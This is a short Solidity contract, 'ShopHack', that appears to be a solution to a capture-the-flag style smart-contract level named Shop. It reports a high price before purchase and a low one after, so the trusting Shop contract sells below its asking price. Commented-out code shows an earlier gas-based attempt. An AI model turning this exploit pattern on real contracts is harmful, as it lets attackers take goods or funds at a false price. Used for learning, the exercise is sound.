// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Shop.sol";
// import "hardhat/console.sol";

contract ShopHack {
    Shop shop;

    constructor(address level) {
        shop = Shop(level);
    }

    function exploit() external {
        shop.buy();
    }

    function price () external view returns (uint) {
        return shop.isSold() ? 1 : 101;
        // console.log("price called: %s", gas); 
        // if (gas > 25000) {
            // console.log("gasleft1: %s", gasleft());
            // while(gasleft() > 30000){
            // }
            // return 101;
        // } else {
			// console.log("gasleft2: %s", gasleft());
            // return 1;
        // }
    }
}